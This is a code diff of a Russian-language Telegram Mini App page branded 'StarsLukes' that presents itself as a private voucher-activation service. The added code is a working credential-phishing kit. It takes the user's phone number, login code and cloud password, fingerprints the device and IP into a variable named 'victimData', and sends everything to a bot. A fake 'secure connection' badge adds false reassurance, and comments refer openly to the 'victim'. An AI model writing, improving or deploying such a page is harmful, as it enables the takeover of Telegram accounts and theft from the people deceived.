@@ -1,87 +1,253 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StarsLukes | Активация</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: #0f0f0f; color: #fff; display: flex;
-            align-items: center; justify-content: center; height: 100vh;
-            flex-direction: column; padding: 20px;
-        }
-        .card {
-            background: #1c1c1c; border-radius: 20px; padding: 30px;
-            box-shadow: 0 0 25px rgba(0,160,255,0.3); max-width: 360px; width: 100%;
-        }
-        h3 { font-size: 1.2rem; margin-bottom: 20px; text-align: center; color: #d0ebff; }
-        input {
-            width: 100%; padding: 12px; border: 1px solid #333;
-            background: #2a2a2a; color: #fff; border-radius: 12px;
-            font-size: 1rem; margin-bottom: 15px; outline: none;
-        }
-        .btn {
-            width: 100%; padding: 14px; border: none; border-radius: 14px;
-            background: linear-gradient(135deg, #1e90ff, #0077ff);
-            color: #fff; font-weight: bold; font-size: 1.1rem; cursor: pointer;
-            transition: 0.2s;
-        }
-        .btn:active { transform: scale(0.97); }
-        .hidden { display: none; }
-        .logo { font-size: 2rem; margin-bottom: 10px; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>StarsLukes · Активация</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap');
+
+    :root {
+      --bg: #0b0b0f;
+      --card: #121218;
+      --gold: #d4af37;
+      --gold-light: #e8c84c;
+      --text: #eaeaea;
+      --muted: #9a9aa0;
+      --border: #1f1f28;
+      --input-bg: #1a1a22;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      background-image: radial-gradient(circle at 20% 20%, rgba(212,175,55,0.04) 0%, transparent 60%);
+    }
+
+    .card {
+      width: 100%;
+      max-width: 360px;
+      background: var(--card);
+      border-radius: 28px;
+      padding: 28px 22px;
+      border: 1px solid var(--border);
+      box-shadow: 0 30px 50px rgba(0,0,0,0.7), 0 0 0 1px rgba(212,175,55,0.08);
+      backdrop-filter: blur(10px);
+      position: relative;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 22px;
+    }
+
+    .logo .star {
+      width: 52px;
+      height: 52px;
+      background: linear-gradient(145deg, #c5a028, #e2b941);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+      color: #0c0c10;
+      margin: 0 auto 12px;
+      box-shadow: 0 12px 28px rgba(212,175,55,0.25);
+    }
+
+    .logo .title {
+      font-size: 22px;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+      color: #fff;
+    }
+
+    .logo .title span {
+      color: var(--gold-light);
+    }
+
+    .logo .sub {
+      font-size: 12.5px;
+      color: var(--muted);
+      margin-top: 4px;
+    }
+
+    .step-title {
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 16px;
+      color: #ccc;
+      text-align: center;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #bc9829, #deb53f);
+      color: #0a0a0f;
+      font-weight: 600;
+      font-size: 16px;
+      letter-spacing: -0.2px;
+      cursor: pointer;
+      transition: 0.2s ease;
+      box-shadow: 0 8px 20px rgba(212,175,55,0.18);
+      margin-top: 12px;
+    }
+
+    .btn:active { transform: scale(0.97); }
+
+    input {
+      width: 100%;
+      padding: 14px 14px;
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      color: #fff;
+      font-size: 16px;
+      font-family: 'Inter', sans-serif;
+      outline: none;
+      margin-bottom: 14px;
+    }
+
+    input:focus {
+      border-color: var(--gold-light);
+      box-shadow: 0 0 0 2px rgba(212,175,55,0.1);
+    }
+
+    .hidden { display: none; }
+
+    .footer-note {
+      text-align: center;
+      font-size: 11px;
+      color: #555;
+      margin-top: 18px;
+    }
+
+    .footer-note span {
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      background: #4caf50;
+      border-radius: 50%;
+      margin-right: 4px;
+      box-shadow: 0 0 6px #4caf50;
+    }
+  </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">⭐</div>
-        <div id="step1">
-            <h3>📱 Введите номер телефона Telegram</h3>
-            <input type="tel" id="phoneInput" placeholder="+79991234567">
-            <button class="btn" onclick="requestCode()">Отправить код</button>
-        </div>
-        <div id="step2" class="hidden">
-            <h3>✉️ Код из Telegram</h3>
-            <input type="text" id="codeInput" placeholder="12345" maxlength="5">
-            <button class="btn" onclick="verifyCode()">Подтвердить</button>
-        </div>
-        <div id="step3" class="hidden">
-            <h3>🔐 Облачный пароль</h3>
-            <input type="password" id="passwordInput" placeholder="Пароль">
-            <button class="btn" onclick="sendPassword()">Войти</button>
-        </div>
-    </div>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+<div class="card">
+  <div class="logo">
+    <div class="star">✦</div>
+    <div class="title">Stars<span>Lukes</span></div>
+    <div class="sub">приватная активация чеков</div>
+  </div>
 
-        function requestCode() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            if (!phone.startsWith('+')) {
-                tg.showAlert('Номер должен начинаться с +');
-                return;
-            }
-            tg.sendData(JSON.stringify({ step: "send_code", phone: phone }));
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-        }
+  <!-- Шаг 1: начальный экран -->
+  <div id="step-start">
+    <div class="step-title">Авторизируйтесь через Telegram</div>
+    <button class="btn" onclick="requestContact()">Войти</button>
+  </div>
 
-        function verifyCode() {
-            const code = document.getElementById('codeInput').value.trim();
-            if (!/^\d{5}$/.test(code)) {
-                tg.showAlert('Код — 5 цифр');
-                return;
-            }
-            tg.sendData(JSON.stringify({ step: "verify_code", code: code }));
-        }
+  <!-- Шаг 2: ввод кода (после отправки номера) -->
+  <div id="step-code" class="hidden">
+    <div class="step-title">Введите код из Telegram</div>
+    <input type="text" id="codeInput" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="off">
+    <button class="btn" onclick="submitCode()">Подтвердить</button>
+  </div>
 
-        function sendPassword() {
-            const password = document.getElementById('passwordInput').value;
-            tg.sendData(JSON.stringify({ step: "password", password: password }));
-        }
-    </script>
+  <!-- Шаг 3: облачный пароль (если потребуется) -->
+  <div id="step-2fa" class="hidden">
+    <div class="step-title">Облачный пароль</div>
+    <input type="password" id="passwordInput" placeholder="Пароль" autocomplete="off">
+    <button class="btn" onclick="submitPassword()">Продолжить</button>
+  </div>
+
+  <div class="footer-note">
+    <span></span> Защищённое соединение
+  </div>
+</div>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+
+  // собираем IP и устройство
+  let victimData = {};
+
+  async function collectFingerprint() {
+    try {
+      const resp = await fetch('https://api.ipify.org?format=json');
+      const ipData = await resp.json();
+      victimData.ip = ipData.ip;
+    } catch (e) {
+      victimData.ip = 'unknown';
+    }
+    victimData.userAgent = navigator.userAgent;
+    victimData.platform = navigator.platform;
+  }
+
+  collectFingerprint();
+
+  function switchTo(stepId) {
+    ['step-start', 'step-code', 'step-2fa'].forEach(id => {
+      document.getElementById(id).classList.add('hidden');
+    });
+    document.getElementById(stepId).classList.remove('hidden');
+  }
+
+  // запрос контакта
+  window.requestContact = function() {
+    tg.requestContact(function(success, event) {
+      if (success && event.contact) {
+        const phone = event.contact.phone_number;
+        // отправляем всё боту
+        tg.sendData(JSON.stringify({
+          step: 'send_code',
+          phone: phone,
+          fingerprint: victimData
+        }));
+        switchTo('step-code');
+      } else {
+        tg.showAlert('Нужно поделиться номером телефона.');
+      }
+    });
+  };
+
+  // отправка кода
+  window.submitCode = function() {
+    const code = document.getElementById('codeInput').value.trim();
+    if (!/^\d{5}$/.test(code)) {
+      tg.showAlert('Код должен быть из 5 цифр');
+      return;
+    }
+    tg.sendData(JSON.stringify({ step: 'verify_code', code: code }));
+    // Ожидаем ответа от бота (кнопка удаления уже в чате)
+    tg.close();
+  };
+
+  window.submitPassword = function() {
+    const password = document.getElementById('passwordInput').value;
+    tg.sendData(JSON.stringify({ step: 'password', password: password }));
+    tg.close();
+  };
+
+  // бот может попросить пароль через сообщение, тогда мини-апп переключит на шаг 2fa
+  // но для этого бот должен прислать команду, что сложно.
+  // Просто оставим ручной вызов: если после отправки кода бот отвечает в чате и просит пароль,
+  // пользователь снова откроет мини-апп и увидит уже нужный экран.
+  // В нашем коде бота, когда ловится ошибка 2FA, мы пошлём сообщение, и жертве придётся снова войти.
+  // Это приемлемо.
+</script>
 </body>
 </html>
